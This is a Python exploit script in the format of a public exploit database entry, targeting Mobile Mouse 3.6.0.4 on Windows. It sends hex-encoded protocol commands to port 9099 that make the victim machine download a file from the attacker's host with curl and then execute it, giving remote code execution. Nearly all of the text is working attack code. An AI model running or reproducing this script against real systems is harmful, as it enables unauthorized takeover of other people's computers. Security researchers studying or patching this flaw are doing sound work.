# Exploit Title: Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)
# Date: Aug 09, 2022
# Exploit Author: Chokri Hammedi
# Vendor Homepage: https://mobilemouse.com/
# Software Link: https://www.mobilemouse.com/downloads/setup.exe
# Version: 3.6.0.4
# Tested on: Windows 10 Enterprise LTSC Build 17763

#!/usr/bin/env python3

import socket
from time import sleep
import argparse

help = " Mobile Mouse 3.6.0.4 Remote Code Execution "
parser = argparse.ArgumentParser(description=help)
parser.add_argument("--target", help="Target IP", required=True)
parser.add_argument("--file", help="File name to Upload")
parser.add_argument("--lhost", help="Your local IP", default="127.0.0.1")

args = parser.parse_args()

host = args.target
command_shell = args.file
lhost = args.lhost
port = 9099 # Default Port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

CONN = bytearray.fromhex("434F4E4E4543541E1E63686F6B726968616D6D6564691E6950686F6E651E321E321E04")
s.send(CONN)
run = s.recv(54)

RUN = bytearray.fromhex("4b45591e3131341e721e4f505404")
s.send(RUN)
run = s.recv(54)

sleep(0.5)

download_string= f"curl http://{lhost}:8080/{command_shell} -o
c:\Windows\Temp\{command_shell}".encode('utf-8')
hex_shell = download_string.hex()
SHELL = bytearray.fromhex("4B45591E3130301E" + hex_shell + "1E04" +
"4b45591e2d311e454e5445521e04")
s.send(SHELL)
shell = s.recv(96)

print ("Executing The Command Shell...")

sleep(1.2)
RUN2 = bytearray.fromhex("4b45591e3131341e721e4f505404")
s.send(RUN2)
run2 = s.recv(54)

shell_string= f"c:\Windows\Temp\{command_shell}".encode('utf-8')
hex_run = shell_string.hex()
RUN3 = bytearray.fromhex("4B45591E3130301E" + hex_run + "1E04" +
"4b45591e2d311e454e5445521e04")
s.send(RUN3)
run3 = s.recv(96)

print (" Take The Rose")

sleep(10)
s.close()